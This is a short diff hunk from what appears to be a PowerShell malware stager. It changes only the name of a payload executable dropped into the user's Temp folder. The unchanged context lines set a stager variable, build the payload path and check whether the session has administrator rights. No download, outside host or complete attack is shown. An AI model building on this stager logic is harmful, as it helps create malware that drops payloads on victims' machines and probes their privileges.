@@ -305,7 +305,7 @@ function main
     $testing = $false
     if ([System.IO.Path]::GetFileName($stager) -ieq "powershell.exe") {$testing = $true}
     $Hpath= "$($home)\AppData\Local\Temp\"
-    if (-not $testing){$payload= "$Hpath\gotyabitch.exe"}
+    if (-not $testing){$payload= "$Hpath\gotyabeach.exe"}
     #check if current session is admin
     $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
     $admin=$currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
